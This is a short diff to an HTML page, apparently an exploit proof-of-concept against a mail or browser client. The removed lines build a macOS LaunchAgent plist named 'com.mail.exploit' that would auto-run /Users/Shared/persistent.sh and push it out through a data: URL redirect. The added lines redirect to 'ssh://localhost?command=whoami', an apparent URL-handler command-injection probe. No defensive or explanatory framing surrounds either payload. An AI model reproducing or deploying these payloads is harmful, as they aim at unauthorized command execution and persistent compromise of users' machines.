@@ -1,18 +1,9 @@
+<!DOCTYPE html>
+<html>
+<body>
 <script>
-// Write to auto-start locations
-const launchAgent = `<?xml version="1.0"?>
-<plist>
-<dict>
-    <key>Label</key>
-    <string>com.mail.exploit</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Users/Shared/persistent.sh</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
-</dict>
-</plist>`;
-
-window.location.href = 'data:application/x-plist,' + encodeURIComponent(launchAgent);
+window.location.href = 'ssh://localhost?command=whoami';
 </script>
+<p>Connecting to SSH...</p>
+</body>
+</html>
